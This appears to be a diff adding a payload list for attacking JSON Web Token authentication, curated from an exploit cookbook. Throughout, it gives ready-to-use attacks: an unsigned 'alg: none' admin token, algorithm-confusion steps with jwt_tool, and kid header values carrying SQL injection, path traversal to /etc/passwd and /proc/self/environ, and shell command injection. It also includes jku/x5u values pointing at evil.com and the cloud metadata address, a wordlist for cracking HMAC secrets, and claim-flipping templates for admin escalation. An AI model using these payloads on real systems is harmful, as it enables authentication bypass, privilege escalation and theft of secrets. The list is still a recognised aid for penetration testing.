@@ -1,0 +1,115 @@
+# JWT Attack Payloads - Curated from exploit-cookbook
+# Source: security-arsenal-argus.md + articles-saml-auth-tokens-playbook.md
+
+# Algorithm none bypass
+# Change header: {"alg":"none","typ":"JWT"}
+# Remove signature, keep dot: header.payload.
+
+# Algorithm confusion (RS256 → HS256)
+# Use public key as HMAC secret
+# jwt_tool.py -T -S hs256 -k public.pem
+
+# Common JWT weaknesses
+# 1. alg: none → bypass signature verification
+# 2. alg: HS256 with public key → use pubkey as secret
+# 3. kid: /dev/null → empty key
+# 4. kid: ../../../../dev/null → path traversal
+# 5. jku: http://evil.com/jwks.json → key injection
+# 6. x5u: http://evil.com/cert.pem → cert injection
+
+# JWT token templates
+# Admin token (none alg):
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.
+
+# SSRF via jku
+{"typ":"JWT","alg":"RS256","jku":"http://evil.com/jwks.json"}
+
+# SQLi in kid
+{"typ":"JWT","alg":"RS256","kid":"key' OR '1'='1"}
+
+# Path traversal in kid
+{"typ":"JWT","alg":"RS256","kid":"../../../../dev/null"}
+
+# kid injection payloads
+{"typ":"JWT","alg":"RS256","kid":"../../../etc/passwd"}
+{"typ":"JWT","alg":"RS256","kid":"..%2f..%2f..%2f..%2fdev%2fnull"}
+{"typ":"JWT","alg":"RS256","kid":"key'; DROP TABLE users;--"}
+{"typ":"JWT","alg":"RS256","kid":"$(whoami)"}
+{"typ":"JWT","alg":"RS256","kid":"`id`"}
+{"typ":"JWT","alg":"HS256","kid":"/proc/self/environ"}
+{"typ":"JWT","alg":"RS256","k":"../../../../secret.key"}
+
+# jku / x5u key injection (SSRF + key hijack)
+{"typ":"JWT","alg":"RS256","jku":"http://evil.com/jwks.json"}
+{"typ":"JWT","alg":"RS256","jku":"http://169.254.169.254/.aws/latest/meta-data/"}
+{"typ":"JWT","alg":"RS256","jku":"http://evil.com#"}
+{"typ":"JWT","alg":"RS256","jku":"file:///etc/hostname"}
+{"typ":"JWT","alg":"RS256","x5u":"http://evil.com/cert.pem"}
+{"typ":"JWT","alg":"ES256","jku":"http://127.0.0.1:6379/"}
+
+# Weak/brute-force HMAC secret (john / hashcat / seckit)
+# secret candidates to bruteforce:
+secret
+password
+123456
+1234
+admin
+admin123
+secret
+jwt_secret
+jwt-secret
+your-256-bit-secret
+not-so-secret
+hush
+changeme
+letmein
+qwerty
+password123
+12345678
+1234567890
+123456789
+12345678910
+abc123
+admin@123
+supersecret
+0123456789abcdef0123456789abcdef
+# Command:
+# seckrit crack eyJ... 
+# jwt_tool.py -C -d wordlist.txt eyJ...
+# python3 -c 'import hashlib,base64;h=hashlib.sha256(b"SECRET").digest();print(base64.urlsafe_b64encode(h).rstrip(b"=").decode())'
+
+# Claims manipulation templates
+# stolen (attacker-controlled) user payload -> flip:
+{"sub":"attacker","role":"user","exp":9999999999}
+# flip to:
+{"sub":"attacker","role":"admin","exp":9999999999}
+# nested claim pollution:
+{"sub":"u","admin":true,"role":{"admin":true}}
+# token type confusion (id_token vs access_token):
+{"typ":"ID_TOKEN","sub":"admin","iss":"https://idp"}
+
+# alg: none variants (case/variant attacks)
+{"alg":"none","typ":"JWT"}
+{"alg":"nOnE","typ":"JWT"}
+{"alg":"NONE","typ":"JWT"}
+{"alg":"nOnE","typ":"JWT","crit":["none"]}
+{"alg":"RS256","typ":"JWT"}  # uppercase-alg confusion on some libs
+
+# Signature bypass - empty / weak
+# JWT with signature = "secret"  (alg HS256, secret="secret")
+# header: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
+# payload: eyJzdWIiOiJhZG1pbiJ9
+# sig: eyJ...  +  <base64url(hmac_sha256("secret", h+p))>
+
+# Key confusion: RS256 token signed with an EC/EdDSA key, verify as ES
+# jwt_tool.py -T -A ES256 -k public.pem  -> flip RS256 public key to ES256
+
+# jwk injection (replace kid with inline jwk)
+{"typ":"JWT","alg":"RS256","jwk":{"kty":"oct","k":"Lk..."}}
+
+# Header injection / verbose errors
+{"alg":"HS256","kid":"key; cat /etc/passwd","typ":"JWT"}
+
+# Replay / alg negotiation (try each alg against live endpoint)
+# For each of: none HS256 HS384 HS512 RS256 RS384 RS512 ES256 ES384 ES512 PS256
+# sign the same payload and send; note which one the server accepts.
